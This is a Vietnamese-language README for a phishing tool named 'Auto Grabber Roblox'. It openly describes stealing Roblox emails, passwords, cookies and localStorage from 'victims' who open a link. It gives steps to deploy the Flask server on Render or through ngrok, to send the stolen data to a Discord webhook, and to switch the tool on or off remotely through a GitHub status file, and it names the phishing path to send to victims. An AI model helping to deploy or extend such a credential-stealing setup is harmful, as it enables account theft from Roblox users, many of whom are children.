# Auto Grabber Roblox

Lấy thông tin đăng nhập Roblox (email, password, cookie, localStorage) tự động khi nạn nhân truy cập link.

## Cách hoạt động
- Truy cập vào trang chính để xem trạng thái.
- Trạng thái được lấy từ file `status.txt` trên GitHub.
- Nếu `status.txt` chứa `start` → hệ thống hoạt động.
- Nếu `status.txt` chứa `stop` → hệ thống dừng.

## Triển khai
1. Fork repo này.
2. Sửa `main.py`:
   - Thay `STATUS_URL` bằng link raw của file `status.txt` trong repo của bạn.
   - Thay `DISCORD_WEBHOOK_URL` bằng webhook của bạn.
3. Deploy lên Render (hoặc chạy local + ngrok).

## Điều khiển
- Chỉ cần sửa nội dung file `status.txt` trên GitHub thành `start` hoặc `stop` và commit.
- Bot sẽ tự động đọc trạng thái mới trong vòng vài giây.

## Link gửi nạn nhân
`/login/roblox` (ví dụ: `https://your-domain.com/login/roblox`)

## Yêu cầu
- Python 3.8+
- Flask, requests (có trong requirements.txt)
